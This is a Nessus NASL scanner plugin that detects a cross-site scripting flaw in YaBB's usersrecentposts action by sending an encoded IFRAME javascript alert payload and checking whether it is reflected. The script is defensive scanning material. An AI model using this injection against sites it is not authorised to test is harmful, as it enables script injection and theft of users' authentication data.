#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(17305);
  script_version("$Revision: 1.3 $");

  script_cve_id("CAN-2005-0741", "CAN-2005-0785");
  script_bugtraq_id(12756);

  name["english"] = "YaBB usersrecentposts Cross-Site Scripting Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The installed version of YaBB (Yet Another Bulletin Board) on the
remote host suffers from a remote cross-site scripting flaw due to its
failure to properly sanitize input passed via the 'username' parameter
and used as part of the 'usersrecentposts' action.  By exploiting this
flaw, a remote attacker can cause arbitrary code to be executed in a
user's browser in the context of the affected web site, resulting in
the theft of authentication data or other such attacks. 

Solution : Upgrade to YaBB version 2 RC2 or greater.
Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for usersrecentposts cross-site scripting vulnerability in YaBB";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses : XSS";
  script_family(english:family["english"]);

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);

if (get_kb_item("www/"+port+"/generic_xss")) exit(0);
if (get_kb_item("www/no404/"+port)) exit(0);

# Search for YaBB in a couple of different locations in addition to
# cgi_dirs() based on googling for '"powered by YaBB" intext:"Yabb 2 RC"'.
dirs = make_list(cgi_dirs());
xtra_dirs = make_array(
  "/cgi-bin/yabb", 1,
  "/cgi-bin/yabb2", 1
);
foreach dir (dirs) {
  # Set value to zero if it's already in dirs.
  if (!isnull(xtra_dirs[dir])) xtra_dirs[dir] = 0;
}
foreach dir (keys(xtra_dirs)) {
  # Add it to dirs if the value is still set.
  if (xtra_dirs[dir]) dirs = make_list(dirs, dir);
}
foreach dir (dirs) {
  # Try to exploit it with an alert saying "Nessus-was-here".
  exploit = "<IFRAME%20SRC%3Djavascript:alert('Nessus%2Dwas%2Dhere')><%252FIFRAME>";
  req = http_get(
    item:string(
      dir, "/YaBB.pl?",
      "action=usersrecentposts;username=", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req);

  # If we see the magic phrase, it's a problem.
  if ("<IFRAME SRC=javascript:alert('Nessus%2Dwas%2Dhere')" >< res) { security_warning(port); exit(0); }
}
